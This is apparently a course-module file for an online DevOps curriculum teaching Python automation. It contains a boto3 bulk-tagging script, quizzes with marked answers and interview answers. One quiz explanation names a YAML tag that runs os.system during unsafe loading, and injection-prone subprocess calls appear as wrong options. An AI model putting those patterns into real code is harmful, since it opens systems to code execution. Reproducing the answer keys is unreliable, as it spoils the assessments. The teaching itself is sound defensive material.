    q: ['<code>tag_resources</code> returns successfully. How do you know every resource was tagged?', ['Inspect <code>FailedResourcesMap</code>; it lists per-ARN errors even when the call succeeds', 'A 200 status means all were tagged', 'Call <code>describe_tags</code> on all 20', 'Check CloudTrail the next day'], 0, 'Batch APIs report partial failure in the body. Collect those ARNs with their error codes, retry the retryable ones, and report the rest.'],
    h: ['<p>Hint 1: <code>get_paginator("get_resources").paginate(ResourceTypeFilters=[...])</code>, then filter locally for resources whose <code>Tags</code> lack the key or have another value: that makes re-runs idempotent.</p>', '<p>Hint 2: chunk ARNs into lists of 20; use <code>Config(retries={"mode": "adaptive", "max_attempts": 10})</code> (client-side rate limiting) and a modest pool, e.g. 4 workers.</p>', '<p>Hint 3: collect <code>FailedResourcesMap</code> entries; retry those with throttling-type error codes once more after a pause; report the others (AccessDenied, invalid ARN) and exit 1 if any remain.</p>'],
    a: `<p>Observe, plan, apply in batches. The paginator lists candidate resources; a local filter keeps only those not already carrying the right value, which is what makes the job safe to re-run. ARNs are chunked by the API's limit of 20 and sent through a small thread pool with the SDK's adaptive retry mode, which adds client-side rate limiting on top of exponential backoff, so throttling is handled once, in the SDK, instead of in nested home-made loops. Partial failures are read from <code>FailedResourcesMap</code>; throttled items get one more pass, everything else is reported with its error code. Dry run prints the counts; <code>--apply --yes</code> plus the account guard are required to write.</p>`,
    code: `#!/usr/bin/env python3
"""bulk_tag.py --account 123456789012 --key CostCenter --value cc-2077 [--apply --yes]"""
import argparse
import logging
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import boto3
from botocore.config import Config

log = logging.getLogger("bulk_tag")
CFG = Config(retries={"mode": "adaptive", "max_attempts": 10})
TYPES = ["ec2:instance", "ec2:volume", "s3:bucket", "rds:db"]
RETRYABLE = {"ThrottlingException", "InternalServiceException", "Throttling"}


def missing_arns(tagging, key, value):
    out = []
    for page in tagging.get_paginator("get_resources").paginate(ResourceTypeFilters=TYPES):
        for r in page["ResourceTagMappingList"]:
            tags = {t["Key"]: t["Value"] for t in r.get("Tags", [])}
            if tags.get(key) != value:
                out.append(r["ResourceARN"])
    return out


def tag_batch(tagging, arns, key, value):
    resp = tagging.tag_resources(ResourceARNList=arns, Tags={key: value})
    return {arn: info.get("ErrorCode", "Unknown") for arn, info in resp.get("FailedResourcesMap", {}).items()}


def apply_all(tagging, arns, key, value, workers=4):
    batches = [arns[i:i + 20] for i in range(0, len(arns), 20)]
    failed = {}
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for result in pool.map(lambda b: tag_batch(tagging, b, key, value), batches):
            failed.update(result)
    return failed


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--account", required=True)
    p.add_argument("--region", default="eu-west-1")
    p.add_argument("--key", required=True)
    p.add_argument("--value", required=True)
    p.add_argument("--apply", action="store_true")
    p.add_argument("--yes", action="store_true")
    args = p.parse_args(argv)
    if args.apply and not args.yes:
        p.error("--apply needs --yes")
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    session = boto3.Session(region_name=args.region)
    if session.client("sts").get_caller_identity()["Account"] != args.account:
        log.error("wrong account; refusing")
        return 2
    tagging = session.client("resourcegroupstaggingapi", config=CFG)
    pending_arns = missing_arns(tagging, args.key, args.value)
    log.info("%d resource(s) need %s=%s (%d batches)", len(pending_arns), args.key, args.value, -(-len(pending_arns) // 20))
    if not args.apply or not pending_arns:
        return 0

    failed = apply_all(tagging, pending_arns, args.key, args.value)
    retry = [a for a, code in failed.items() if code in RETRYABLE]
    if retry:
        time.sleep(10)                                            # let the rate limiter recover
        for arn in retry:
            failed.pop(arn)
        failed.update(apply_all(tagging, retry, args.key, args.value, workers=1))
    for arn, code in sorted(failed.items()):
        log.error("FAILED %s %s", arn, code)
    log.info("tagged=%d failed=%d", len(pending_arns) - len(failed), len(failed))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())`,
    cx: `<p>⌈N / 20⌉ write calls (250 for 5,000 resources) plus the listing pages, instead of 5,000 single calls. With 4 workers and adaptive retries it finishes in minutes and stays under the API's rate limits.</p>`,
    f: ['How would you roll this out to 40 accounts in the organisation safely?', 'Tag policies in AWS Organizations can enforce values. How do they change the need for this script?']
  }));

  // ───────────────────────── Quiz ─────────────────────────
  quiz.push({ q: 'A cleanup script calls <code>s3.list_objects_v2(Bucket=b)</code> once and loops over <code>resp["Contents"]</code>. The bucket has 2.4 million objects. What happens?', options: ['It processes at most 1000 objects and reports success', 'It raises an error about too many objects', 'It processes all objects slowly', 'boto3 paginates automatically on a plain client call'], answer: 0, explain: 'A single list call returns one page (max 1000 keys) plus a continuation token. Nothing fails; the rest is simply never requested. Use <code>get_paginator("list_objects_v2")</code>.' });
  quiz.push({ q: 'Why must config files be loaded with <code>yaml.safe_load</code> rather than <code>yaml.load(f, Loader=yaml.UnsafeLoader)</code>?', options: ['The unsafe loader can construct arbitrary Python objects and call functions, so a file can run code', 'safe_load is faster', 'yaml.load cannot read lists', 'safe_load keeps comments'], answer: 0, explain: 'Tags like <code>!!python/object/apply:os.system</code> make the full/unsafe loaders execute code while parsing. safe_load only builds plain types. (PyYAML 6 requires an explicit Loader for yaml.load.)' });
  quiz.push({ q: 'Which call style is correct for running a command with a value that came from a file?', options: ['<code>subprocess.run(["du", "-sh", path], check=True, timeout=30)</code>', '<code>os.system("du -sh " + path)</code>', '<code>subprocess.run(f"du -sh {path}", shell=True)</code>', '<code>subprocess.Popen("du -sh " + path)</code>'], answer: 0, explain: 'A list of arguments avoids the shell, so characters like ; or $( ) in the value cannot start other commands. The timeout and check=True make hangs and failures visible.' });
  quiz.push({ q: 'An API returns these statuses in turn. Which one should a retry loop <b>not</b> retry?', options: ['403 Forbidden', '429 Too Many Requests', '503 Service Unavailable', 'a connection timeout'], answer: 0, explain: '403 means the request is not allowed; sending it again cannot change that. 429, 5xx and timeouts are transient and worth retrying with backoff.' });
  quiz.push({ q: 'How do you read the AWS error code from a <code>botocore.exceptions.ClientError</code> named <code>e</code>?', options: ['<code>e.response["Error"]["Code"]</code>', '<code>e.code</code>', '<code>e.args[0]["Code"]</code>', '<code>str(e).split(":")[0]</code>'], answer: 0, explain: 'ClientError carries the parsed error response. Branch on the Code (e.g. InvalidSnapshot.NotFound, AccessDenied) and log ResponseMetadata.RequestId for support.' });
  quiz.push({ q: 'What does <code>ec2.get_waiter("instance_running").wait(InstanceIds=[iid])</code> do by default?', options: ['Polls describe_instances every 15 s, up to 40 times, and raises WaiterError on failure states or timeout', 'Blocks forever until the instance runs', 'Starts the instance and waits', 'Subscribes to an EventBridge event'], answer: 0, explain: 'Waiters are polling helpers defined in the service model. Tune them with WaiterConfig={"Delay": ..., "MaxAttempts": ...}.' });
  quiz.push({ q: 'Which way of giving a Python script on an EC2 instance access to S3 is best?', options: ['Attach an IAM role (instance profile) and call <code>boto3.Session()</code> with no keys', 'Put access keys in the script', 'Put access keys in a .env file committed to Git', 'Pass keys as command-line arguments'], answer: 0, explain: 'The default credential chain picks up short-lived role credentials from the instance metadata service. No secret is ever stored or typed.' });
  quiz.push({ q: 'boto3 returns <code>StartTime</code> as a timezone-aware datetime. Which comparison works?', options: ['<code>snap["StartTime"] &lt; datetime.now(timezone.utc) - timedelta(days=30)</code>', '<code>snap["StartTime"] &lt; datetime.now() - timedelta(days=30)</code>', '<code>snap["StartTime"] &lt; datetime.utcnow() - timedelta(days=30)</code>', '<code>snap["StartTime"] &lt; "2026-09-19"</code>'], answer: 0, explain: 'Aware and naive datetimes cannot be compared (TypeError). datetime.now() and utcnow() are naive; comparing to a string is a TypeError too.' });
  quiz.push({ q: 'A destructive script should behave how when run with no flags?', options: ['Print the plan (dry run) and change nothing', 'Delete, because that is its job', 'Ask for a password', 'Exit with an error'], answer: 0, explain: 'Safe defaults: dry run unless the operator passes --apply and a confirmation such as --yes. Forgetting a flag then means "nothing happened", not "everything was deleted".' });
  quiz.push({ q: 'What makes a cron-run tagging script idempotent?', options: ['It reads current tags, computes the difference to the desired tags, and writes only that difference', 'It runs inside a try/except', 'It uses a thread pool', 'It logs every action'], answer: 0, explain: 'Observe, diff, apply the difference: a second run finds nothing to do. Logging and error handling are good, but they do not make repeated runs safe.' });
  quiz.push({ q: 'In <code>pyproject.toml</code>, what does <code>snapclean = "opstools.clean_snapshots:main"</code> under <code>[project.scripts]</code> create?', options: ['A <code>snapclean</code> command that calls <code>main()</code>; its return value becomes the exit code', 'A Python module named snapclean', 'A cron entry', 'A Docker image'], answer: 0, explain: 'Installers generate a launcher for each entry point; pipx then puts it on your PATH inside an isolated virtual environment.' });
  quiz.push({ q: 'Which feature is the main reason ops teams write some CLIs in Go?', options: ['A single static binary that is easy to cross-compile and copy anywhere', 'Go has more AWS services than boto3', 'Go does not need error handling', 'Go scripts run without compiling'], answer: 0, explain: 'GOOS/GOARCH cross-compilation and static binaries (CGO_ENABLED=0) mean no runtime or dependencies on the target, which suits tools shipped to many machines and tiny containers.' });
  quiz.push({ q: 'A test uses <code>ec2 = Mock()</code> and asserts the dry run never calls <code>delete_snapshot</code>. What is the weakness?', options: ['A bare Mock accepts any method name, so a typo like delete_snapshots would pass silently', 'Mock cannot record calls', 'Mock requires network access', 'Mock only works with moto'], answer: 0, explain: 'Use create_autospec or botocore Stubber, which validate operation names and parameters against the real service model.' });

  // ───────────────────────── Interview ─────────────────────────
  interview.push({ level: 'B', q: 'When do you write an automation task in Python rather than bash?', a: `<p>Bash is great for gluing a few commands together, and I keep it for short wrappers, entrypoints and one-screen scripts. I move to Python when the script handles <b>data</b> (JSON from APIs, YAML inventories), talks to <b>APIs</b> with pagination, retries and error codes, needs real data structures, dates or per-item error handling, grows past roughly a hundred lines, or needs <b>tests</b>. In Python I get argparse for a proper CLI, logging with levels, <code>subprocess.run</code> with argument lists and timeouts instead of string-built shell commands, pathlib for files, and boto3 with paginators and waiters. A practical sign: as soon as I am writing <code>jq</code> inside a bash loop or parsing HTTP status codes from curl, it is time for Python.</p>`, followUps: ['What would you still keep in bash inside a Python-heavy toolkit?', 'How do you call an existing bash script safely from Python?'] });
  interview.push({ level: 'B', q: 'How does a Python script authenticate to AWS without hardcoding credentials?', a: `<p>It relies on boto3's <b>default credential chain</b>. Locally I use a named profile, ideally IAM Identity Center (SSO), selected with <code>boto3.Session(profile_name=...)</code> or <code>AWS_PROFILE</code>. On EC2 the instance profile role provides short-lived credentials through IMDSv2; on ECS, Lambda and EKS the task or pod role does the same; in CI, GitHub Actions assumes a role through OIDC. For other accounts I call <code>sts.assume_role</code> and build a session from the temporary keys. The code itself contains no keys, and other secrets (API tokens, webhook URLs) come from environment variables or a secrets manager, read with <code>os.environ["NAME"]</code> so a missing value fails loudly. Before changing anything, the script checks <code>sts.get_caller_identity()</code> against the expected account id.</p>`, followUps: ['Which credential wins if both AWS_ACCESS_KEY_ID and an instance role are present?', 'Why is IMDSv2 preferred over IMDSv1?'] });
  interview.push({ level: 'B', q: 'What is pagination and what bug does missing it cause?', a: `<p>APIs return large results in pages with a token for the next page: S3 lists at most 1000 keys per call, EC2 describe calls use NextToken, GitHub uses Link headers. If a script makes a single call, it silently processes only the first page. The classic incident is a cleanup job that "deletes 1000 objects" every night for months while the bucket keeps growing, because no error is ever raised. The fix is to use boto3's <code>get_paginator(...).paginate(...)</code>, or a hand-written generator that loops until no token comes back, guards against a repeated token, and does not stop on an empty page that still has a token. I also test with a fake that has more than one page, because small test data hides the bug.</p>`, followUps: ['How would you stop early once you found what you need?', 'How do you avoid listing billions of objects at all?'] });
  interview.push({ level: 'I', q: 'How do you handle errors from boto3 calls?', a: `<p>Most AWS failures raise <code>botocore.exceptions.ClientError</code>, so I catch that and branch on <code>e.response["Error"]["Code"]</code>. For a cleanup, <code>NotFound</code> codes count as success (idempotent), <code>InUse</code>-style codes mean skip and report, <code>AccessDenied</code>/<code>UnauthorizedOperation</code> stop the run because retrying is pointless, and anything unexpected is logged with the request id and counted as a failure. Throttling and transient errors I leave to the SDK by configuring <code>Config(retries={"mode": "standard", "max_attempts": 10})</code>, rather than wrapping calls in my own loops. Some services expose modeled exceptions like <code>s3.exceptions.NoSuchBucket</code>, which are subclasses of ClientError. Credentials problems raise <code>NoCredentialsError</code> and waiters raise <code>WaiterError</code>. The script continues per item, then exits non-zero if anything failed.</p>`, followUps: ['Why not catch Exception around the whole loop?', 'What does DryRunOperation mean?'] });
  interview.push({ level: 'I', q: 'Explain retries with exponential backoff and jitter. What should and should not be retried?', a: `<p>On a transient failure you wait and try again, doubling the wait each time up to a cap (1, 2, 4, 8 s...), and stop after a fixed number of attempts so the job fails visibly instead of hanging. Jitter randomises each wait, typically "full jitter" <code>uniform(0, min(cap, base·2<sup>n</sup>))</code>, so many clients that failed together do not retry in lockstep. Retry timeouts, connection errors, 429 (respecting <code>Retry-After</code>) and 5xx. Do not retry 4xx client errors like 400, 401, 403 or 404. Be careful with non-idempotent requests: a retried POST can create duplicates, so use an idempotency key or ClientToken, or check before creating. Retry at one layer only; SDKs already retry, and nested loops multiply load during an outage.</p>`, followUps: ['What is the worst-case wait for 5 retries with base 1 s and cap 30 s?', 'How does urllib3 Retry decide which methods to retry?'] });
  interview.push({ level: 'I', q: 'How would you write a script that deletes untagged EBS snapshots older than 30 days, safely?', a: `<p>Argparse with <code>--account</code>, <code>--region</code>, <code>--days</code>, and <code>--apply</code> plus <code>--yes</code>; dry run is the default. Credentials from the default chain, and a guard that compares <code>get_caller_identity()["Account"]</code> with <code>--account</code>. A paginator over <code>describe_snapshots(OwnerIds=["self"])</code>, a pure filter for "no tags and StartTime older than now minus 30 days" using timezone-aware UTC, and a plan that is logged in full. A circuit breaker aborts if the plan exceeds a maximum count. In apply mode it deletes one by one, treating <code>InvalidSnapshot.NotFound</code> as done, skipping <code>InUse</code> (used by an AMI) and stopping on access errors, with a summary and non-zero exit on failures. Tests use Stubber or moto. I would also check whether AWS Backup or Data Lifecycle Manager should own this instead, and enable a Recycle Bin rule so mistakes are recoverable.</p>`, followUps: ['How would you exclude snapshots managed by AWS Backup?', 'How would you run it across all accounts in the organisation?'] });
  interview.push({ level: 'I', q: 'What does idempotent mean for automation, and how do you implement it in Python?', a: `<p>Running the job once or many times leads to the same end state, and a run with nothing to do changes nothing. It matters because automation is retried by cron, CI and operators, and jobs die halfway. I implement it as a reconciler: read the desired state (config), observe the current state (paginated API reads), compute a diff as a plan, show it in dry run, and apply only the differences. Deleting something already gone counts as success, creates use ClientTokens or conditional writes so a retry cannot duplicate, and state files are written atomically with a temp file and <code>os.replace</code>. For cron I add an <code>fcntl.flock</code> lock so runs never overlap. The test is simple: run twice and expect "0 changes" the second time; kill it halfway and expect the next run to finish cleanly.</p>`, followUps: ['When is "check then create" not enough?', 'How do you lock across several hosts?'] });
  interview.push({ level: 'I', q: 'How do you test automation that talks to AWS?', a: `<p>I structure the code so most of it does not talk to AWS: pure functions for decisions (age filters, tag diffs, plans) tested with plain pytest asserts and boundary cases. AWS calls live in thin functions that take a client as a parameter. For exact call sequences and error branches I use <code>botocore.stub.Stubber</code> on a real client: queue responses and client errors, then <code>assert_no_pending_responses()</code>. For whole flows I use moto's <code>@mock_aws</code>, create resources, run <code>main([...])</code>, and assert what is left. An autouse fixture sets fake credentials and removes <code>AWS_PROFILE</code>, so nothing can reach a real account. I test argparse behaviour (apply without yes exits 2), that dry run makes zero writes, pagination with multiple pages, and exit codes. One sandbox run before release checks what mocks cannot: IAM permissions.</p>`, followUps: ['Why prefer Stubber or autospec over a bare Mock?', 'What does moto not verify by default?'] });
  interview.push({ level: 'I', q: 'How do you handle JSON and YAML safely in automation?', a: `<p>JSON: <code>json.loads</code>/<code>json.dump</code>, <code>.get()</code> for optional fields, <code>indent=2, sort_keys=True</code> for files in Git, <code>default=str</code> for datetimes, and atomic writes with a temp file plus <code>os.replace</code> for state files. YAML: always <code>yaml.safe_load</code>; the full or unsafe loaders can build arbitrary Python objects, so a malicious file could execute code. After loading I validate the shape and fail with the file and key name. I watch for YAML 1.1 implicit typing in PyYAML: <code>NO</code> becomes False, <code>0755</code> becomes 493, <code>1.10</code> becomes 1.1, <code>22:30</code> becomes 1350; quote such values and run yamllint in CI. When a human-maintained YAML must be edited by a script, I use ruamel.yaml round-trip mode to keep comments.</p>`, followUps: ['How would you detect duplicate keys?', 'How do you process a 5 GB JSON export?'] });
  interview.push({ level: 'A', q: 'Design a tool that keeps every resource in 40 AWS accounts tagged with Owner and CostCenter.', a: `<p>Prefer prevention first: AWS Organizations tag policies and SCPs that deny creating resources without tags, plus Terraform modules that set them. The tool handles drift and legacy. Architecture: a scheduled job (EventBridge Scheduler → ECS task or Lambda) in a central account, assuming a least-privilege role in each member account via STS. Per account and region it lists resources with the Resource Groups Tagging API (paginated), computes a plan against the desired rules (fill missing Owner from a mapping such as the CloudFormation stack or account owner; enforce CostCenter values), and writes the plan to S3 and a report. Apply mode is enabled per account after review, writes with <code>tag_resources</code> in batches of 20 using adaptive retries, inspects <code>FailedResourcesMap</code>, and has a per-run change cap. It is idempotent, so reruns are safe. Metrics (non-compliant count per account) go to CloudWatch and a dashboard; failures alert via webhook. Tests: pure planner unit tests plus moto for the flow.</p>`, followUps: ['How do you avoid fighting with Terraform over tag values?', 'How would you roll out apply mode gradually?'] });
  interview.push({ level: 'A', q: 'A colleague\'s Python job runs from cron every hour and sometimes doubles its work or leaves half-finished state. How do you fix it?', a: `<p>First find out why: overlapping runs (a run taking longer than an hour), retries after a timeout that happened <b>after</b> the side effect, or state written before the work was confirmed. Then fix structurally. Add a non-blocking <code>fcntl.flock</code> lock so a second run exits 0 with "already running", and a timeout so one stuck run cannot block forever. Make each step idempotent: reconcile against observed state instead of "process the next N items", record progress atomically right after each confirmed step, use ClientTokens, idempotency keys or conditional writes for creates, and treat NotFound on delete as done. If the job may run on more than one host, a local lock is not enough: use a lease (DynamoDB conditional write with expiry) or run it in exactly one place, like a Kubernetes CronJob with <code>concurrencyPolicy: Forbid</code>. Finally add a test that runs it twice and one that kills it halfway.</p>`, followUps: ['How would you detect that runs are being skipped because of the lock?', 'What is a lease and why does it need an expiry?'] });
  interview.push({ level: 'A', q: 'How do you package and distribute internal Python tools, and when would you choose Go instead?', a: `<p>A <code>pyproject.toml</code> with dependencies and <code>[project.scripts]</code> entry points turns modules into commands. CI runs tests and builds a wheel on each tag; releases go to an internal index (CodeArtifact, Artifactory) or are installed from a Git tag. People and servers install with <code>pipx</code> or <code>uv tool install</code>, which gives each tool its own virtual environment and avoids <code>sudo pip</code> and the externally-managed-environment error. Each tool has <code>--version</code> from package metadata. For scheduled jobs I often ship a container image with pinned dependencies instead. I pick Go when the tool must run on many machines without a Python runtime, needs a tiny container, is called very often so start-up time matters, or extends Kubernetes: Go gives a single static binary and easy cross-compiling with GOOS/GOARCH. For API glue and data shaping that changes often, Python stays faster to write and review.</p>`, followUps: ['How do you make installs reproducible across servers?', 'What does CGO_ENABLED=0 change?'] });
  interview.push({ level: 'E', q: 'How do AI assistants and agents change Python automation work, and how do you keep it safe?', a: `<p>They are excellent at the parts that used to be slow: knowing which boto3 call and paginator to use, writing argparse and click skeletons, translating bash to Python, generating test cases, and explaining error codes. That shifts my time to review, testing and safety design. The predictable risks: missing pagination and timeouts, retries on non-idempotent calls, <code>shell=True</code>, <code>yaml.load</code>, naive datetimes, placeholder credentials that get replaced with real keys, and destructive defaults. My guard rails: every generated script goes through the same review checklist and tests (Stubber or moto, more than one page, boundary dates), runs first in a sandbox account, and has dry run as default with an explicit confirmation, an account guard and a change cap. When an agent can run tools, it gets read-only roles by default, the plan step is free but the apply step needs human approval, and secrets never go into prompts. Idempotent tools matter even more with agents, because agents retry.</p>`, followUps: ['What would be on your review checklist for AI-written boto3 code?', 'How would you expose a cleanup tool to an AI agent safely?'] });

  // ───────────────────────── Module registration ─────────────────────────
  registerModule({
    id: 'devops07',
    title: 'Python for Automation',
    lang: 'python',
    intro: `<p>Bash gets you far, but sooner or later an operations task needs real data structures, API calls, pagination, retries and tests. This module turns you into someone who writes <b>Python automation that a team can trust</b>: scripts with argparse and logging, REST calls with timeouts, retries and webhook alerts, JSON and YAML handled safely, and AWS automation with boto3 (sessions and the credential chain, paginators, waiters, retries and <code>ClientError</code> codes). Then it covers the habits that separate a quick script from a production tool: <b>idempotent</b> reconcilers, dry run by default with explicit confirmation, testing with pytest, Stubber and moto, packaging as an installable CLI with <code>pyproject.toml</code> and pipx, and a short look at why ops teams also use Go.</p>
      <p>Every topic starts from a real situation: the cleanup job that only ever saw the first 1000 S3 objects, untagged EBS snapshots piling up for months, log rotation across a fleet, a Slack alert whose webhook URL must stay secret, a YAML inventory that says <code>NO</code> and means Norway, and a cron job that ran twice. Runnable examples use only the Python standard library, with a local <code>http.server</code> and fake APIs instead of real cloud accounts. AWS examples use a sandbox profile or role and the documentation account id 123456789012; no credential ever appears in code.</p>`,
    goals: [
      'Decide when a bash script should become Python, and structure a script with argparse, logging to stderr, <code>main(argv)</code>, exit codes, pathlib, shutil and list-style <code>subprocess.run</code> with timeouts',
      'Call REST APIs with urllib and requests: timeouts, status checks, retries with exponential backoff and jitter for 429/5xx only, idempotency keys, and Slack/Teams webhook alerts with the URL from the environment',
      'Read and write JSON and YAML safely: <code>yaml.safe_load</code> and why not <code>yaml.load</code>, validation after loading, YAML 1.1 typing traps, atomic writes, and expanding an inventory\'s groups',
      'Paginate every list API (boto3 paginators, NextToken generators, JMESPath search) and explain the "only 1000 objects" bug',
      'Automate AWS with boto3: sessions, profiles and roles via the default credential chain, waiters, standard retry mode, <code>ClientError</code> codes, DryRun and an account-id guard',
      'Build idempotent reconcilers with dry run by default, <code>--apply --yes</code> confirmation, change caps and cron-safe locks, and test them with pytest, unittest.mock, Stubber and moto',
      'Package tools as installable CLIs with <code>[project.scripts]</code> and pipx, and explain when a single static Go binary is the better choice'
    ],
    prereqs: `Required: <b>Cloud &amp; DevOps 2</b> (Bash Scripting for Operations): exit codes, safe scripts, cron, flock, dry runs and idempotent habits, which this module carries over into Python, and <b>Python 3</b> (Strings, Files, Modules &amp; Packages): files, <code>with</code>, modules, <code>__name__ == "__main__"</code>, pip and virtual environments. Helpful: <b>Python 2</b> (Control Flow, Functions &amp; Core Collections) for dicts, lists and comprehensions, which every API response uses. Cloud examples assume the AWS basics from the Cloud Fundamentals modules, but every runnable example works without an AWS account.`,
    langExplain: `<p>This module is about <b>Python</b> automation, so lessons, problems and solutions are Python. Runnable examples use only the standard library; boto3, requests, PyYAML, click, pytest and moto examples are shown for reading and need <code>pip install</code>. A few snippets are bash (cron lines), YAML (inventories), TOML (pyproject) and one Go program, because those are the real formats you meet next to Python tools.</p>`,
    hours: 12,
    topics: topics,
    practice: practice,
    quiz: quiz,
    interview: interview
  });
})();
